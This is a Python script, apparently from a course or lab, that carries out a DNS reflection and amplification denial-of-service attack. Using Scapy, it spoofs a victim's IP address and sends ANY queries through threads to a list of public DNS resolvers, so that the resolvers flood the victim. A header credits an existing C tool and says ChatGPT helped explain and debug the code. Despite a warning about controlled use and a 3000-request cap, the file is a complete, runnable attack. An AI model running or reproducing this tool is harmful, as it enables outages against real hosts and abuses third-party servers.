# NOTES:
# References: Highly advanced DNS distributed reflection DoS C code found on GitHub which sources the author: noptrix (http://www.noptrix.net/ - http://www.majorsecurity.net) 
# AI Usage: ChatGPT used for explaining the very large C code to break down how DNS amplification works and how it differs from DNS reflection and for debugging purposes. Also used for extracting DNS servers from: https://public-dns.info/. 
# This python code is not sourced from another author but follows and simplifies the main implemtation flow of noptrix.
# WARNING: This code should only be used in a controlled environment as denial of service attacks are illegal if used maliciously.


from scapy.all import * # Scapy is used for packet manipulation and for allows the construction, sending, and receiving of network packets in the code.
import time # The time module is used for tracking the time intervals and measuring time elapsed.
import sys  # Here, sys is used for handling command-line arguments and exiting the script.
import random    # The random module is used for selecting random domains from the list.
import threading    # The threading module allows the program to run multiple threads concurrently, which is necessary for sending DNS requests in parallel to multiple DNS servers and thus causing amplification

# Validate input arguments #

if len(sys.argv)<3:
    print("Usage: python3 <program> target_port(Usually 53) dns_servers_file")
    sys.exit()

target_port=int(sys.argv[1])
dns_servers_file=sys.argv[2]

# Get spoofed IP address from user input #

spoofed_ip = input("Enter the spoofed IP address: ")

# Acces DNS server IPs from the text file #

try:
    with open(dns_servers_file, 'r') as f:
        dns_servers=[line.strip() for line in f if line.strip()] # Just telling the code to read the file line by line 
except FileNotFoundError:
    print(f"Error: The file '{dns_servers_file}' could not be found.")
    sys.exit()

if not dns_servers:
    print("No DNS servers available in the provided file.")
    sys.exit()

# List of domains to query throughout the attack to improve amplification #

domains = ["google.com", "yahoo.com", "facebook.com", "youtube.com", "twitter.com"]

# Set the limit for the number of requests #

request_limit=3000

# Function to send DNS requests in parallel using victim's spoofed IP #

def send_dns_request(dns_server):
    global request_count, data_sent
    while request_count<request_limit:
        random_domain=random.choice(domains) # Choose random domain from the list

        # Construct a DNS request packet:
        # IP layer: dst is set to the DNS server's IP, and src is the spoofed IP address.
        # UDP layer: dport is set to port 53 (DNS port), and sport is set to the target port (randomized).
        # DNS layer: DNS query (qd) for a random domain with query type ANY to support amplification.

        dns_request=IP(dst=dns_server, src=spoofed_ip) / UDP(dport=53, sport=target_port) / DNS(rd=1, qd=DNSQR(qname=random_domain, qtype='ANY'))
        request_count+=1
        response=sr1(dns_request, timeout=1, verbose=False)
        if response:
            data_sent+=len(response)  # Calculate size of each response

# Track the number of requests and total data sent #

request_count=0
data_sent=0   # size of the response data that the victim receives
start_time=time.time()
interval=10.0 # To calculate number of requests and data sent to the victim by DNS servers per 10 seconds

# Create and start threads to send DNS requests #

threads=[]
for dns_server in dns_servers:
    thread=threading.Thread(target=send_dns_request, args=(dns_server,))
    threads.append(thread)
    thread.start()

# Monitor request count and report status every 10 seconds #

while request_count<request_limit:
    time.sleep(interval)
    print(f"DNS Spoofer Request Status: {request_count} requests sent - Size of data sent of the responses: {data_sent / 1000} KB in the last {interval} seconds")
    data_sent=0  # Reset data size for the next 10 secs interval 

# Terminate the attack once the limit is reached. In usual scenarios, the code is terminated by the attacker but will apply this for simplicity #

print(f"For testing purposes, the limit of {request_limit} requests has been reached. Terminating program.")
